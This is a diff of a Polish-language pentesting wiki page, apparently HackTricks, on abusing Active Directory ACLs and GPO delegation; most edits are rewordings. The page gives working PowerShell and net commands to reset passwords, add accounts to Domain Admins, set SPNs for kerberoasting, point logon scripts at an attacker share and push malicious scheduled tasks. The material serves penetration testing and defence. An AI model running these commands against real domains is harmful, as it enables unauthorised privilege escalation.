@@ -4,11 +4,17 @@
 
 **Ta strona jest głównie podsumowaniem technik z** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **i** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Aby uzyskać więcej szczegółów, sprawdź oryginalne artykuły.**
 
+## BadSuccesor
+
+{{#ref}}
+BadSuccesor.md
+{{#endref}}
+
 ## **Prawa GenericAll na użytkownika**
 
-Ten przywilej daje atakującemu pełną kontrolę nad kontem docelowego użytkownika. Gdy prawa `GenericAll` zostaną potwierdzone za pomocą polecenia `Get-ObjectAcl`, atakujący może:
+Ten przywilej przyznaje atakującemu pełną kontrolę nad kontem użytkownika. Gdy prawa `GenericAll` zostaną potwierdzone za pomocą polecenia `Get-ObjectAcl`, atakujący może:
 
-- **Zmienić hasło docelowego użytkownika**: Używając `net user <username> <password> /domain`, atakujący może zresetować hasło użytkownika.
+- **Zmienić hasło docelowego**: Używając `net user <username> <password> /domain`, atakujący może zresetować hasło użytkownika.
 - **Celowane Kerberoasting**: Przypisz SPN do konta użytkownika, aby uczynić je kerberoastable, a następnie użyj Rubeus i targetedKerberoast.py, aby wyodrębnić i spróbować złamać hashe biletu przyznającego (TGT).
 ```bash
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
@@ -21,7 +27,7 @@ Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
 ## **GenericAll Rights on Group**
 
-To uprawnienie pozwala atakującemu na manipulowanie członkostwem grupy, jeśli ma prawa `GenericAll` w grupie takiej jak `Domain Admins`. Po zidentyfikowaniu wyróżnionej nazwy grupy za pomocą `Get-NetGroup`, atakujący może:
+Ten przywilej pozwala atakującemu na manipulowanie członkostwem grupy, jeśli ma prawa `GenericAll` w grupie takiej jak `Domain Admins`. Po zidentyfikowaniu wyróżnionej nazwy grupy za pomocą `Get-NetGroup`, atakujący może:
 
 - **Dodać Siebie do Grupy Domain Admins**: Można to zrobić za pomocą bezpośrednich poleceń lub korzystając z modułów takich jak Active Directory lub PowerSploit.
 ```bash
@@ -59,7 +65,7 @@ net group "domain admins" spotless /add /domain
 ```
 ## **ForceChangePassword**
 
-Posiadanie `ExtendedRight` na użytkowniku dla `User-Force-Change-Password` umożliwia resetowanie haseł bez znajomości aktualnego hasła. Weryfikacja tego prawa i jego wykorzystanie mogą być przeprowadzone za pomocą PowerShell lub alternatywnych narzędzi wiersza poleceń, oferując kilka metod resetowania hasła użytkownika, w tym sesje interaktywne i jednowierszowe polecenia dla środowisk nieinteraktywnych. Polecenia obejmują od prostych wywołań PowerShell po użycie `rpcclient` na Linuksie, co pokazuje wszechstronność wektorów ataku.
+Posiadanie `ExtendedRight` na użytkowniku dla `User-Force-Change-Password` umożliwia resetowanie haseł bez znajomości aktualnego hasła. Weryfikacja tego prawa i jego wykorzystanie mogą być przeprowadzone za pomocą PowerShell lub alternatywnych narzędzi wiersza poleceń, oferując kilka metod resetowania hasła użytkownika, w tym sesje interaktywne i jednowierszowe polecenia dla środowisk nieinteraktywnych. Polecenia obejmują od prostych wywołań PowerShell po użycie `rpcclient` na Linuksie, co demonstruje wszechstronność wektorów ataku.
 ```bash
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainUserPassword -Identity delegate -Verbose
@@ -80,13 +86,13 @@ Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
 ## **GenericWrite na użytkowniku**
 
-To uprawnienie pozwala atakującemu na modyfikację właściwości użytkownika. Konkretnie, z dostępem `GenericWrite`, atakujący może zmienić ścieżkę skryptu logowania użytkownika, aby wykonać złośliwy skrypt po logowaniu użytkownika. Osiąga się to poprzez użycie polecenia `Set-ADObject`, aby zaktualizować właściwość `scriptpath` docelowego użytkownika, aby wskazywała na skrypt atakującego.
+To uprawnienie pozwala atakującemu na modyfikację właściwości użytkownika. W szczególności, mając dostęp `GenericWrite`, atakujący może zmienić ścieżkę skryptu logowania użytkownika, aby wykonać złośliwy skrypt po logowaniu użytkownika. Osiąga się to za pomocą polecenia `Set-ADObject`, aby zaktualizować właściwość `scriptpath` docelowego użytkownika, aby wskazywała na skrypt atakującego.
 ```bash
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
 ## **GenericWrite na grupie**
 
-Dzięki temu uprawnieniu, atakujący mogą manipulować członkostwem w grupie, na przykład dodając siebie lub innych użytkowników do konkretnych grup. Proces ten polega na utworzeniu obiektu poświadczeń, użyciu go do dodawania lub usuwania użytkowników z grupy oraz weryfikacji zmian członkostwa za pomocą poleceń PowerShell.
+Dzięki temu uprawnieniu, atakujący mogą manipulować członkostwem w grupie, na przykład dodając siebie lub innych użytkowników do konkretnych grup. Proces ten obejmuje tworzenie obiektu poświadczeń, używanie go do dodawania lub usuwania użytkowników z grupy oraz weryfikację zmian członkostwa za pomocą poleceń PowerShell.
 ```bash
 $pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
@@ -96,7 +102,7 @@ Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'use
 ```
 ## **WriteDACL + WriteOwner**
 
-Posiadanie obiektu AD i posiadanie uprawnień `WriteDACL` umożliwia atakującemu przyznanie sobie uprawnień `GenericAll` do obiektu. Osiąga się to poprzez manipulację ADSI, co pozwala na pełną kontrolę nad obiektem i możliwość modyfikacji jego członkostwa w grupach. Mimo to, istnieją ograniczenia przy próbie wykorzystania tych uprawnień za pomocą poleceń `Set-Acl` / `Get-Acl` modułu Active Directory.
+Posiadanie obiektu AD i posiadanie uprawnień `WriteDACL` na nim umożliwia atakującemu przyznanie sobie uprawnień `GenericAll` do obiektu. Osiąga się to poprzez manipulację ADSI, co pozwala na pełną kontrolę nad obiektem i możliwość modyfikacji jego członkostwa w grupach. Mimo to, istnieją ograniczenia przy próbie wykorzystania tych uprawnień za pomocą poleceń `Set-Acl` / `Get-Acl` modułu Active Directory.
 ```bash
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
@@ -112,17 +118,19 @@ Atak DCSync wykorzystuje specyficzne uprawnienia replikacji w domenie, aby naśl
 
 ### Delegacja GPO
 
-Delegowane uprawnienia do zarządzania obiektami zasad grupy (GPO) mogą stwarzać znaczące ryzyko bezpieczeństwa. Na przykład, jeśli użytkownik taki jak `offense\spotless` ma delegowane prawa do zarządzania GPO, może mieć uprawnienia takie jak **WriteProperty**, **WriteDacl** i **WriteOwner**. Te uprawnienia mogą być nadużywane w celach złośliwych, co można zidentyfikować za pomocą PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+Delegowany dostęp do zarządzania obiektami zasad grupy (GPO) może stwarzać znaczące ryzyko bezpieczeństwa. Na przykład, jeśli użytkownik taki jak `offense\spotless` ma delegowane prawa do zarządzania GPO, może mieć uprawnienia takie jak **WriteProperty**, **WriteDacl** i **WriteOwner**. Te uprawnienia mogą być nadużywane w celach złośliwych, co można zidentyfikować za pomocą PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
 ### Wyliczanie uprawnień GPO
 
 Aby zidentyfikować źle skonfigurowane GPO, można połączyć cmdlety PowerSploit. Umożliwia to odkrycie GPO, do których dany użytkownik ma uprawnienia do zarządzania: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-**Komputery z zastosowaną daną polityką**: Możliwe jest ustalenie, które komputery mają zastosowaną konkretną GPO, co pomaga zrozumieć zakres potencjalnego wpływu. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
+**Komputery z zastosowaną daną polityką**: Możliwe jest ustalenie, do których komputerów stosuje się konkretne GPO, co pomaga zrozumieć zakres potencjalnego wpływu. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
 
 **Polityki zastosowane do danego komputera**: Aby zobaczyć, jakie polityki są zastosowane do konkretnego komputera, można wykorzystać polecenia takie jak `Get-DomainGPO`.
 
 **OUs z zastosowaną daną polityką**: Identyfikacja jednostek organizacyjnych (OUs) dotkniętych daną polityką może być przeprowadzona za pomocą `Get-DomainOU`.
+
+Możesz również użyć narzędzia [**GPOHound**](https://github.com/cogiceo/GPOHound), aby wyliczyć GPO i znaleźć w nich problemy.
 
 ### Nadużycie GPO - New-GPOImmediateTask
 
@@ -145,11 +153,11 @@ SharpGPOAbuse oferuje metodę wykorzystania istniejących GPO poprzez dodawanie 
 ```
 ### Wymuszenie aktualizacji polityki
 
-Aktualizacje GPO zazwyczaj odbywają się co około 90 minut. Aby przyspieszyć ten proces, szczególnie po wprowadzeniu zmiany, można użyć polecenia `gpupdate /force` na docelowym komputerze, aby wymusić natychmiastową aktualizację polityki. To polecenie zapewnia, że wszelkie modyfikacje GPO są stosowane bez czekania na następny automatyczny cykl aktualizacji.
+Aktualizacje GPO zazwyczaj występują co około 90 minut. Aby przyspieszyć ten proces, szczególnie po wprowadzeniu zmiany, można użyć polecenia `gpupdate /force` na docelowym komputerze, aby wymusić natychmiastową aktualizację polityki. To polecenie zapewnia, że wszelkie modyfikacje GPO są stosowane bez czekania na następny automatyczny cykl aktualizacji.
 
 ### Pod maską
 
-Po zbadaniu zaplanowanych zadań dla danego GPO, takiego jak `Misconfigured Policy`, można potwierdzić dodanie zadań takich jak `evilTask`. Te zadania są tworzone za pomocą skryptów lub narzędzi wiersza poleceń mających na celu modyfikację zachowania systemu lub eskalację uprawnień.
+Po zbadaniu zaplanowanych zadań dla danego GPO, takiego jak `Misconfigured Policy`, można potwierdzić dodanie zadań takich jak `evilTask`. Zadania te są tworzone za pomocą skryptów lub narzędzi wiersza poleceń mających na celu modyfikację zachowania systemu lub eskalację uprawnień.
 
 Struktura zadania, jak pokazano w pliku konfiguracyjnym XML generowanym przez `New-GPOImmediateTask`, określa szczegóły zaplanowanego zadania - w tym polecenie do wykonania i jego wyzwalacze. Ten plik przedstawia, jak zaplanowane zadania są definiowane i zarządzane w ramach GPO, zapewniając metodę do wykonywania dowolnych poleceń lub skryptów jako część egzekwowania polityki.
 
@@ -159,7 +167,7 @@ GPO umożliwiają również manipulację członkostwem użytkowników i grup na 
 
 Plik konfiguracyjny XML dla Użytkowników i Grup określa, jak te zmiany są wdrażane. Dodając wpisy do tego pliku, określonym użytkownikom można przyznać podwyższone uprawnienia w systemach objętych zmianami. Ta metoda oferuje bezpośrednie podejście do eskalacji uprawnień poprzez manipulację GPO.
 
-Ponadto, dodatkowe metody wykonywania kodu lub utrzymywania trwałości, takie jak wykorzystanie skryptów logowania/wylogowywania, modyfikacja kluczy rejestru dla autorunów, instalacja oprogramowania za pomocą plików .msi lub edytowanie konfiguracji usług, mogą być również rozważane. Te techniki oferują różne możliwości utrzymania dostępu i kontrolowania docelowych systemów poprzez nadużycie GPO.
+Ponadto, dodatkowe metody wykonywania kodu lub utrzymywania trwałości, takie jak wykorzystanie skryptów logowania/wylogowywania, modyfikacja kluczy rejestru dla autorunów, instalowanie oprogramowania za pomocą plików .msi lub edytowanie konfiguracji usług, mogą być również rozważane. Techniki te oferują różne możliwości utrzymania dostępu i kontrolowania docelowych systemów poprzez nadużycie GPO.
 
 ## Odnośniki
 
